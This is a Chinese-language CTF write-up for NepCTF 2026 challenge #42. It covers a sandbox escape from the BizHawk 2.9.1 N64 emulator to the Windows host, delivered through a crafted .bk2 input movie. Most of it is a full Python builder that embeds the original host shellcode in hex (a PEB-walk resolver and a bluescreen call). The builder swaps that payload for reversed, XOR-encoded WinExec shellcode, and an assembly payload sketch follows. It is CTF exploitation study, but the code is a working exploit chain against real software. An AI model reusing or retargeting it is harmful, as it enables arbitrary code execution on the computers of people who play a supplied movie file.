> 来源：https://github.com/fjh1997/nepctf2026-writeup/blob/main/writeup/WriteUp_%E5%AE%8C%E6%95%B4%E8%87%AA%E5%8C%85%E5%90%AB.md
> 以下为原始完整 writeup 中 #42 的连续章节摘录；代码未执行。

## #42 T.A.S P.W.N

### 1. 题目信息
- **题目名称**：T.A.S P.W.N
- **题目类型**：REALWORLD/PWN
- **最终 Flag**：`NepCTF{You_Control_THE_Swarm_By_TASPLAY!Who_tells_them_there_is_a_problem_with_their_AI_3}`

### 2. 题目分析
T.A.S P.W.N 是 REALWORLD 展示题：BizHawk 2.9.1 + Mupen64Plus + 纸片马 JP，参考 bluescreen% 那条宿主逃逸。目标不是远程读 flag，而是播完 `.bk2` 让宿主弹出计算器（`WinExec("calc")`）；flag 由主办看 PoC 后签发。

### 3. 解题思路
从公开 bluescreen 影片改 HIMITSU body：

- 逻辑 x64 字节**反转**塞进 184B body；
- 保留 guest 侧 XOR keystream 环；
- 调用点从蓝屏改成 `WinExec("calc")`。

重建脚本：`tools/build_calc_bk2.py`。

### 4. 解题过程
```text
cd work/42
python3 tools/build_calc_bk2.py --src poc/bluescreen_orig.bk2 --out poc/calc_show.bk2
```

Windows：BizHawk 2.9.1 + ROM SHA1 `B9CCA3FF260B9FF427D981626B82F96DE73586D3`，播到 ~55345 帧计算器弹出即验收通过。  
Flag：`NepCTF{You_Control_THE_Swarm_By_TASPLAY!Who_tells_them_there_is_a_problem_with_their_AI_3}`（主办签发后提交）。

### 5. 解题代码

下面贴的是我这边实际用过、并且复现能跑通的脚本全文。路径按 work 目录保留，方便对照。

#### `work/42/tools/build_calc_bk2.py`
```python
#!/usr/bin/env python3
"""
Build poc/calc_show.bk2 from bluescreen_orig.bk2.

Verified layout (RDRAM dump after XOR at movie end, BizHawk 2.9.1):

  stage2 packs 12 bytes/frame from controllers (frames 55293..55343):
    p4.x, p4.y, p2.x, p2.y, p3.hi, p2.hi, p3.x, p3.y, p1.hi, p4.hi, p1.x, p1.y

  Buffer at RDRAM 0x807fc000 (612 B):
    guest MIPS  312 B  — OOB PI DMA + host XOR decode (KEEP; do NOT nop)
    host blob   204 B  — header + "HIMITSU!" + 184 B body + trailer
    post MIPS    96 B  — PI DMA helper

  Host body encoding (critical):
    1. Logical x64 shellcode is stored BYTE-REVERSED in the 184 B body
    2. Guest multiplies a 64-bit key each 8 B and XORs that region
    3. After XOR, host enters logical sc at offset +4 (first 4 B pad)

  This builder keeps the original keystream (from hang dump) and original
  PEB/export resolver from bluescreen, only swapping the call site to
  WinExec("calc").
"""
from __future__ import annotations

import argparse
import re
import struct
import zipfile
from pathlib import Path

BIT = {
    11: 0x8000, 10: 0x4000, 9: 0x2000, 8: 0x1000,
    4: 0x0800, 5: 0x0400, 6: 0x0200, 7: 0x0100,
    16: 0x0020, 17: 0x0010,
    12: 0x0008, 13: 0x0004, 15: 0x0002, 14: 0x0001,
}
CTRL_RE = re.compile(r"\s*(-?\d+),\s*(-?\d+),(.*)")
DATA_FRAMES = range(55293, 55344)  # 51 frames → 612 bytes
HOST_OFF = 312
HOST_END = 516
BODY_OFF = 16
BODY_LEN = 184
TRAILER = bytes.fromhex("38060003")
MAGIC = b"HIMITSU!"

# Original bluescreen body plaintext (after guest XOR), recovered via hang dump.
# Logical shellcode = body_pt[::-1]; resolver lives at logical offset 0x7e.
# Keystream = body_ct XOR body_pt (stable across rebuilds of same movie).
ORIG_BODY_PT_HEX = None  # filled at runtime from dump if present, else embedded


def parse_line(line: str):
    parts = line.split("|")
    cons = []
    for p in parts[2:6]:
        m = CTRL_RE.match(p)
        x, y, btn = int(m.group(1)), int(m.group(2)), m.group(3)
        bits = 0
        for i, ch in enumerate(btn):
            if ch not in ". " and i in BIT:
                bits |= BIT[i]
        cons.append({"bits": bits, "x": x & 0xFF, "y": y & 0xFF})
    return cons


def bits_to_btnstr(bits: int) -> str:
    chars = ["."] * 18
    for mask, pos, ch in [
        (0x0800, 4, "U"), (0x0400, 5, "D"), (0x0200, 6, "L"), (0x0100, 7, "R"),
        (0x1000, 8, "S"), (0x2000, 9, "Z"), (0x4000, 10, "B"), (0x8000, 11, "A"),
        (0x0008, 12, "u"), (0x0004, 13, "d"), (0x0001, 14, "r"), (0x0002, 15, "l"),
        (0x0020, 16, "L"), (0x0010, 17, "R"),
    ]:
        if bits & mask:
            chars[pos] = ch
    return "".join(chars)


def sx(v: int) -> int:
    v &= 0xFF
    return v - 256 if v >= 128 else v


def format_line(cons) -> str:
    parts = ["", ".."]
    for c in cons:
        parts.append(f"{sx(c['x']):5d},{sx(c['y']):5d},{bits_to_btnstr(c['bits'])}")
    parts.append("")
    return "|".join(parts)


def pack12(cons) -> bytes:
    p1, p2, p3, p4 = cons
    return bytes([
        p4["x"], p4["y"],
        p2["x"], p2["y"],
        (p3["bits"] >> 8) & 0xFF, (p2["bits"] >> 8) & 0xFF,
        p3["x"], p3["y"],
        (p1["bits"] >> 8) & 0xFF, (p4["bits"] >> 8) & 0xFF,
        p1["x"], p1["y"],
    ])


def unpack12(chunk: bytes, sync_lo: int = 0, free_lo=(0, 0, 0)):
    p4x, p4y, p2x, p2y, p3hi, p2hi, p3x, p3y, p1hi, p4hi, p1x, p1y = chunk
    return [
        {"bits": (p1hi << 8) | free_lo[0], "x": p1x, "y": p1y},
        {"bits": (p2hi << 8) | free_lo[1], "x": p2x, "y": p2y},
        {"bits": (p3hi << 8) | free_lo[2], "x": p3x, "y": p3y},
        {"bits": (p4hi << 8) | (sync_lo & 0xFF), "x": p4x, "y": p4y},
    ]


def extract_stream(frame_lines) -> bytes:
    return b"".join(pack12(parse_line(frame_lines[i])) for i in DATA_FRAMES)


# Original bluescreen logical shellcode (byte-reverse of decrypted body).
# Extracted from hang_after_xor dump @ frame end on BizHawk 2.9.1.
ORIG_LOGICAL_SC = bytes.fromhex(
    "f8bfb45f"
    "4883ec38488d0d4b000000e86a0000004c8d4c24344531c0ba01000000b913000000ffd0"
    "488d0d3e000000e84a000000488d4c243048894c2428c7442420060000004531c94531c0"
    "31d2b9220000c0ffd04883c438c3"
    "52746c41646a75737450726976696c656765004e745261697365486172644572726f7200"
    "514831c065488b4060488b40184883c0205058488b00488b48205a52504883ec20"
    "488b0512000000ff9050ad04004883c4204885c074db5959c3"
)
assert len(ORIG_LOGICAL_SC) == BODY_LEN
RESOLVER = ORIG_LOGICAL_SC[0x7E:]


def build_calc_shellcode() -> bytes:
    """
    Pad(4) + WinExec(calc) using original bluescreen export resolver at 0x7e.
    Host entry is at offset +4 (same as original).
    """
    pad = ORIG_LOGICAL_SC[:4]
    winexec = b"WinExec\x00"
    calc = b"calc\x00"
    str_block = winexec + calc
    res_off = 0x7E
    str_off = res_off - len(str_block)

    parts = bytearray(pad)
    # sub rsp, 0x28
    parts += bytes.fromhex("48 83 ec 28")
    lea1 = len(parts)
    parts += bytes.fromhex("48 8d 0d 00 00 00 00")  # lea rcx, [rip+WinExec]
    call1 = len(parts)
    parts += bytes.fromhex("e8 00 00 00 00")  # call resolver
    lea2 = len(parts)
    parts += bytes.fromhex("48 8d 0d 00 00 00 00")  # lea rcx, [rip+calc]
    parts += bytes.fromhex("ba 01 00 00 00")  # mov edx, 1
    parts += bytes.fromhex("ff d0")  # call rax
    parts += bytes.fromhex("eb fe")  # hang

    if len(parts) > str_off:
        raise SystemExit(f"code too long {len(parts)} > {str_off}")
    parts += b"\x90" * (str_off - len(parts))
    winexec_off = len(parts)
    parts += winexec
    calc_off = len(parts)
    parts += calc
    assert len(parts) == res_off
    parts += RESOLVER
    if len(parts) < BODY_LEN:
        parts += b"\x90" * (BODY_LEN - len(parts))
    parts = bytearray(parts[:BODY_LEN])

    struct.pack_into("<i", parts, lea1 + 3, winexec_off - (lea1 + 7))
    struct.pack_into("<i", parts, call1 + 1, res_off - (call1 + 5))
    struct.pack_into("<i", parts, lea2 + 3, calc_off - (lea2 + 7))
    return bytes(parts)


def build_shellcode() -> bytes:
    """Alias used by older call sites; returns logical (not reversed) stub."""
    return build_calc_shellcode()


def main() -> None:
    ap = argparse.ArgumentParser()
    root = Path(__file__).resolve().parents[1]
    ap.add_argument("--src", type=Path, default=root / "poc" / "bluescreen_orig.bk2")
    ap.add_argument("--out", type=Path, default=root / "poc" / "calc_show.bk2")
    ap.add_argument("--shellcode-out", type=Path, default=root / "poc" / "winexec_calc.bin")
    ap.add_argument(
        "--body-pt",
        type=Path,
        default=None,
        help="Optional decrypted original body (184 B) to derive keystream; "
             "default = reverse(ORIG_LOGICAL_SC)",
    )
    args = ap.parse_args()

    sc = build_calc_shellcode()
    args.shellcode_out.write_bytes(sc)
    if len(sc) != BODY_LEN:
        raise SystemExit(f"shellcode {len(sc)} != {BODY_LEN}")

    with zipfile.ZipFile(args.src) as z:
        files = {n: z.read(n) for n in z.namelist()}

    ilog = files["Input Log.txt"].decode("utf-8")
    nl = "\r\n" if "\r\n" in ilog else "\n"
    lines = ilog.split(nl)
    frame_idxs = [i for i, ln in enumerate(lines) if ln.startswith("|")]
    if len(frame_idxs) != 55345:
        raise SystemExit(f"unexpected frame count {len(frame_idxs)}")
    frame_lines = [lines[i] for i in frame_idxs]

    stream = bytearray(extract_stream(frame_lines))
    if len(stream) != 612:
        raise SystemExit(f"stream {len(stream)} != 612")

    host = stream[HOST_OFF:HOST_END]
    if host[8:16] != MAGIC:
        raise SystemExit(f"magic mismatch: {host[8:16]!r}")
    if host[200:204] != TRAILER:
        raise SystemExit(f"trailer mismatch: {host[200:204].hex()}")

    body_ct = bytes(stream[HOST_OFF + BODY_OFF : HOST_OFF + BODY_OFF + BODY_LEN])
    if args.body_pt and args.body_pt.exists():
        body_pt_orig = args.body_pt.read_bytes()
        if len(body_pt_orig) != BODY_LEN:
            raise SystemExit(f"body-pt len {len(body_pt_orig)}")
    else:
        body_pt_orig = ORIG_LOGICAL_SC[::-1]

    ks = bytes(body_ct[i] ^ body_pt_orig[i] for i in range(BODY_LEN))
    body_pt = sc[::-1]
    body_new = bytes(body_pt[i] ^ ks[i] for i in range(BODY_LEN))

    # Do NOT touch guest XOR — keystream depends on it.
    stream[HOST_OFF + BODY_OFF : HOST_OFF + BODY_OFF + BODY_LEN] = body_new

    for i, frame_no in enumerate(DATA_FRAMES):
        chunk = bytes(stream[i * 12 : (i + 1) * 12])
        li = frame_idxs[frame_no]
        old = parse_line(lines[li])
        sync = old[3]["bits"] & 0xFF
        free = (old[0]["bits"] & 0xFF, old[1]["bits"] & 0xFF, old[2]["bits"] & 0xFF)
        cons = unpack12(chunk, sync_lo=sync, free_lo=free)
        assert pack12(cons) == chunk
        lines[li] = format_line(cons)

    files["Input Log.txt"] = nl.join(lines).encode("utf-8")
    header = files["Header.txt"].decode("utf-8")
    h2 = []
    for ln in header.splitlines():
        if ln.startswith("Author "):
            h2.append(ln + " [NepCTF calc HIMITSU minpatch]")
        elif ln.startswith("rerecordCount "):
            h2.append("rerecordCount 1")
        else:
            h2.append(ln)
    files["Header.txt"] = ("\n".join(h2) + "\n").encode("utf-8")
    files["Comments.txt"] = (
        b"NepCTF 2026 #42: HIMITSU body = reverse(WinExec calc + orig resolver) "
        b"XOR keystream; guest XOR intact. BizHawk 2.9.1 Mupen OOB. bluescreen% base.\n"
    )

    args.out.parent.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(args.out, "w", compression=zipfile.ZIP_DEFLATED) as z:
        for name in [
            "Header.txt", "Comments.txt", "Subtitles.txt",
            "SyncSettings.json", "Input Log.txt",
        ]:
            z.writestr(name, files[name])

    with zipfile.ZipFile(args.out) as z:
        ilog2 = z.read("Input Log.txt").decode("utf-8")
    fl2 = [ln for ln in ilog2.replace("\r\n", "\n").split("\n") if ln.startswith("|")]
    rec = extract_stream(fl2)
    assert rec[HOST_OFF + 8 : HOST_OFF + 16] == MAGIC
    assert rec[HOST_OFF + BODY_OFF : HOST_OFF + BODY_OFF + BODY_LEN] == body_new
    # XOR loop intact
    assert rec[0x78:0x7C] == stream[0x78:0x7C]

    # artifacts
    (root / "poc" / "payload_logical_sc.bin").write_bytes(sc)
    (root / "poc" / "payload_body_ct.bin").write_bytes(body_new)
    (root / "poc" / "keystream_body.bin").write_bytes(ks)

    print(
        f"wrote {args.out} ({args.out.stat().st_size} bytes), "
        f"sc={len(sc)}B body={BODY_LEN}B encoding=reverse+xor keystream"
    )


if __name__ == "__main__":
    main()
```

#### `work/42/poc/host_payload_calc.asm`
```asm
; x86-64 Windows host payload sketch for BizHawk/mupen sandbox escape
; Goal: WinExec("calc\0", SW_SHOW) then return/sleep (no BSOD)
;
; bluescreen% original used NtRaiseHardError for BSOD.
; Challenge wants calc.exe (demo may replace calc with subtitle app).
;
; This is NOT position-ready shellcode: real exploit must:
;  1) resolve kernel32!WinExec (PEB walk or leak from host via OOB read)
;  2) place "calc" string in reachable RW memory
;  3) set stack correctly (x64 shadow space)
;  4) be written via RSP DMA OOB into executable host page OR VirtualProtect
;
; Minimal pseudo-layout once WinExec is known at [win_exec]:

BITS 64
default rel

; rcx = "calc", rdx = 1 (SW_SHOW)
; call WinExec
; optional: ExitThread / infinite loop / return to safe host code

payload:
    sub     rsp, 0x28
    lea     rcx, [rel calc_str]
    mov     edx, 1
    mov     rax, 0x1122334455667788   ; <- patch: WinExec address
    call    rax
    ; hang instead of BSOD
.hang:
    jmp     .hang

calc_str:
    db "calc", 0

; Alternative: NtRaiseHardError BSOD (what bluescreen% used), DO NOT use for challenge:
;   mov r10, rcx
;   mov eax, 0xNN  ; NtRaiseHardError syscall number (version-dependent)
;   syscall
```

### 6. AI 使用说明
这题用了 Claude Code / 偶尔 Grok 帮我盯日志和搓草稿；关键判断、踩坑取舍和最终提交是我自己点的。会话可以按题名在 `~/.claude/projects` 里翻。

---

